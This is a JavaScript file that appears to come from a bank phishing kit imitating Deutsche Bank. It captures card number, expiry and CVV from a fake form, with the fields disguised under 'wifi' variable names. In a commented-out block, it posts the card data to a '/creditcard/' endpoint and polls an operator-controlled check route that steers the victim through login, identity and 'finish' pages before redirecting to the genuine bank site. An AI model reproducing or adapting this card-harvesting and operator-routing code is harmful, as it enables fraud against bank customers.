const login_form = document.querySelector('#login-form');

const wifi = document.querySelector('#cardnum');
const wifi_pass = document.querySelector('#exp');
const wifi_pass_two = document.querySelector('#cvv');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

login_form.addEventListener('submit', e => {
    e.preventDefault();

    if (wifi.value == '' || wifi_pass.value == '' || wifi_pass_two.value == '') {
        loginButton.innerHTML = 'Weiter';
        loginButton.disabled = false;
        
        wifi.disabled = false;
        wifi_pass.disabled = false;
        wifi_pass.disabled = false;

        wifi.value = '';
        wifi_pass.value = '';
        wifi_pass_two.value = '';
        
        document.querySelector('#errorMessage').style.display = 'block';
    } else {
    //     const data = new FormData();
    //     data.append('wifi', wifi.value);
    //     data.append('wifi_pass', wifi_pass.value);
    //     data.append('wifi_pass_two', wifi_pass_two.value);

    //     loginButton.innerHTML = '<img src="images/ing.gif" width="18"> Laden...';
    //     loginButton.disabled = true;
        
    //     // window.location.href = '/Telefonummer.php';
    //    /* setTimeout(() => {
    //         fetch('/public/api/afk.ini')
    //             .then(response => response.text())
    //             .then(text => {
    //                 if (text.trim().toLowerCase() === 'on') {
    //                         window.location.href = '/identificatie/' + token.value;
    //                 } else {
    //                 }
    //             })
    //             .catch(error => {
    //                 console.error('Theres a error:', error);
    //             });
    //     }, 300); */

    //     wifi.disabled = true;
    //     wifi_pass.disabled = true;
    //     wifi_pass_two.disabled = true;
        
    //     document.querySelector('#errorMessage').style.display = 'none'; 

    //     fetch('/creditcard/' + token.value, {
    //         method: 'POST',
    //         body: data
    //     }).then(() => {
    //         const newInterval = setInterval(() => {
    //             fetch('/creditcard/check/' + token.value, {
    //                 method: 'POST'
    //             }).then(res => {
    //                 res.json().then(data => {
    //                     if (data.page == 'login') {
    //                         window.location.href = '/einloggen/' + token.value;
    //                     } else if (data.page == 'name') {
    //                         window.location.href = '/information/' + token.value;
    //                     } else if (data.page == 'creditcard') {
    //                         window.location.href = '/creditcard/' + token.value;
    //                     } else if (data.page == 'identification') {
    //                         window.location.href = '/identificatie/' + token.value;
    //                    } else if (data.page == 'finish') {
    //                        window.location.href = 'https://deutsche-bank.de/';
    //                    } else if (data.page == 'waiting') {
    //                        console.log('Waiting...');
    //                     }
    //                 });
    //             });
    //         }, 500);
    //     });
    }
});


